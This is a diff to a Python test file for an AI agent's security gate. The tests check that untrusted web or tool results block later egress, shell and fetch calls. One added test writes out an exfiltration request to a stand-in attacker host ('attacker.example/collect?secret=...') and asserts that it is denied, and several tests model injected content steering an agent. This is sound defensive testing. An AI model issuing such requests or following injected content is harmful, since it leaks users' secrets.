@@ -439,6 +439,39 @@ def test_external_context_blocks_model_controlled_web_fetch_egress():
     ).allowed is True
 
 
+def test_control_plane_context_still_allows_brokered_web_fetch():
+    """Skills/runtime descriptors are server-owned, not external result content.
+
+    The skills index arms the gate (its name/description fields are
+    user-editable), but it must not turn every "search → fetch this page"
+    continuation into an approval prompt: web_fetch is a brokered public
+    reader whose URL/tool policy remains the sandbox. Genuinely external
+    taint (a real web/tool result) still blocks it.
+    """
+    context = ToolRunSecurityContext()
+    context.observe_messages([
+        {"role": "user",
+         "metadata": {"trusted": False, "source": "skills", "tool_gate_untrusted": True},
+         "content": "skills index"},
+    ])
+    assert context.external_untrusted_context_seen is True
+    assert set(context.external_sources) == {"skills"}
+
+    assert context.decision_for(
+        "web_fetch",
+        '{"url":"https://www.spacex.com/launches/"}',
+    ).allowed is True
+
+    # A real external tool result re-taints the run: egress is blocked again.
+    context.observe_tool_result("web_fetch", {"output": "page text"})
+    decision = context.decision_for(
+        "web_fetch",
+        '{"url":"https://attacker.example/collect?secret=..."}',
+    )
+    assert decision.allowed is False
+    assert "network_egress" in decision.reason
+
+
 def test_unknown_mcp_tool_fails_closed_after_external_context():
     context = ToolRunSecurityContext(external_untrusted_context_seen=True)
 
@@ -897,7 +930,7 @@ def test_fake_weak_model_search_then_bash_next_round_is_blocked(monkeypatch):
         agent_loop.stream_agent_loop(
             "http://local.test/v1",
             "small-local-model",
-            [{"role": "user", "content": "research this and inspect my workspace"}],
+            [{"role": "user", "content": "web_search research this and inspect my workspace"}],
             max_rounds=2,
             relevant_tools={"web_search", "bash"},
         )
@@ -934,7 +967,7 @@ def test_fake_weak_model_search_then_bash_same_batch_is_blocked(monkeypatch):
         agent_loop.stream_agent_loop(
             "http://local.test/v1",
             "small-local-model",
-            [{"role": "user", "content": "research this and inspect my workspace"}],
+            [{"role": "user", "content": "web_search research this and inspect my workspace"}],
             max_rounds=2,
             relevant_tools={"web_search", "bash"},
         )
@@ -968,7 +1001,7 @@ def test_search_then_model_controlled_fetch_same_batch_is_blocked(monkeypatch):
         agent_loop.stream_agent_loop(
             "http://local.test/v1",
             "small-local-model",
-            [{"role": "user", "content": "research this"}],
+            [{"role": "user", "content": "web_search research this"}],
             max_rounds=2,
             relevant_tools={"web_search", "web_fetch"},
         )
@@ -1001,7 +1034,7 @@ def test_search_then_document_same_batch_has_no_editor_side_effect(monkeypatch):
         agent_loop.stream_agent_loop(
             "http://local.test/v1",
             "small-local-model",
-            [{"role": "user", "content": "research this and write a document"}],
+            [{"role": "user", "content": "web_search research this and write a document"}],
             max_rounds=2,
             relevant_tools={"web_search", "create_document"},
         )
